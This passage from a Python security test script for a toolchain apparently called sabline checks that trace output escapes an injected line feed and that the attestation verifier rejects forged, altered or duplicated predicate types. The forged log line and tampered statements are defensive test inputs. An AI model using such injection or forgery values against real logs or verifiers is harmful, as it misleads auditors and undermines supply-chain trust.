    traced = prog(d, 'fn echo(t: Text) -> Text {\n    return t\n}\n\n'
                  'fn main() uses io {\n'
                  '    let shown = echo("a\\n<- main = forged")\n'
                  '    print("done")\n}\n', "traced.vel")
    code, out, _ = run(["trace", traced, "--allow", "io"], cwd=d)
    ok("LG2 sabline trace writes a value holding a line feed on one line",
       "\\n<- main = forged" in out and not any(
           x.strip().startswith("<- main = forged") for x in out.splitlines()),
       out[-300:])

    # VF1: the verifier refuses every type Sabline does not define
    run(["attest", hello, "--output", "vf-base.json"], cwd=d)
    with open(os.path.join(d, "vf-base.json"), encoding="utf-8") as fh:
        sabline_attest = json.load(fh)
    for label, value in (("velaris.dev", "https://velaris.dev/capability/v1"),
                         ("upper-case host",
                          "HTTPS://sabline.dev/capability/v1"),
                         ("a trailing slash",
                          sabline.CAPABILITY_PREDICATE_TYPE + "/"),
                         ("surrounding space",
                          " " + sabline.CAPABILITY_PREDICATE_TYPE),
                         ("a list", [sabline.CAPABILITY_PREDICATE_TYPE]),
                         ("null", None)):
        statement = dict(sabline_attest, predicateType=value)
        path = os.path.join(d, "vf.json")
        json.dump(statement, open(path, "w", encoding="utf-8"))
        code, out, _ = run(["verify", path], cwd=d)
        ok(f"VF1 sabline verify refuses a predicate type that is {label}",
           code == 1, out[-200:])
    for value in sabline.CAPABILITY_PREDICATE_TYPES:
        json.dump(dict(sabline_attest, predicateType=value),
                  open(os.path.join(d, "vf.json"), "w", encoding="utf-8"))
        code, out, _ = run(["verify", os.path.join(d, "vf.json")], cwd=d)
        ok(f"VF1 ...and verifies {value}", code == 0, out[-200:])
    text = json.dumps(sabline_attest)
    open(os.path.join(d, "vf2.json"), "w", encoding="utf-8").write(
        text[:-1] + ', "predicateType": "https://velaris.dev/capability/v1"}')
    code, out, _ = run(["verify", os.path.join(d, "vf2.json")], cwd=d)
    ok("VF2 a Statement that gives its predicate type twice is not read",
       code == 2, out[-200:])


def main() -> Any:
    release_83_cases()
    int_edge_cases()
    shadow_cases()
    split_cases()
    cache_cases()
    user_cache_cases()
    recursion_cases()
    compiler_limits_cases()
    secret_cases()
    sandbox_cases()
    ffi_cases()
    self_influence_cases()
    trace_cases()
    witness_cases()
    pool_cases()
    proxy_break_cases()
    builtin_shadow_cases()
    credential_break_cases()
    add_redirect_cases()
    prover_name_cases()
    import_read_cases()
    receipt_leak_cases()
    eject_widening_cases()
    door_rate_cases()
    print(f"\n{PASS}/{PASS + FAIL} passed" + (f"  ({FAIL} FAILED)" if FAIL else ""))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
